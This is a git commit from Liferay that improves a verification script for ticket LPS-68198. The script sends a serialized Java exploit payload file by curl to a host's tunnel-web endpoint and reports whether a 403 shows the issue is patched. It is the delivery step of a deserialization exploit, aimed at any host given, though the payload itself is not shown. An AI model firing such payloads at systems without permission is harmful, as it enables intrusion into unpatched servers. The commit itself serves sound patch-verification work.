e41c576f2fc1c60b9b80a7b98a5fb972a29a224b
Enoch Chu <enoch.chu@liferay.com>
2017-06-22 18:17:26 -0700

    LPS-68198 Improve script by giving context
    I used this script and forgot what I was looking for. So I thought maybe
    it would be a good idea to give some sort of helpful response since I
    will most likely forget again in the future.

--- blue/LPS-68198/script.sh
+++ blue/LPS-68198/script.sh
@@ -1,5 +1,19 @@
 #/bin/bash
 
-# You may want to change the URL
+if [[ $# -eq 0  ]] ; then
+	echo "Script requires a host"
+	echo "Example: ./script.sh http://www.liferay.com"
+	exit 0
+fi
 
-curl -v -H "Content-Type: application/x-java-serialized-object" --data-binary "@liferay-tunnelweb-exploit.data" localhost:8080/api/liferay/pwn
+HOST=$1
+
+RESPONSE=$(curl -v -H "Content-Type: application/x-java-serialized-object" --data-binary "@liferay-tunnelweb-exploit.data" $HOST/api/liferay/pwn)
+
+echo ""
+
+if [[ $RESPONSE == *"HTTP Status 403"*  ]]; then
+	echo -e "\xf0\x9f\x91\x8c   HTTP Status 403 has been found. Ticket should've been patched."
+else
+	echo -e "\xf0\x9f\x98\x9e   HTTP Status 403 has not been found. Vulnerability could still exist. Please observe the curl response."
+fi
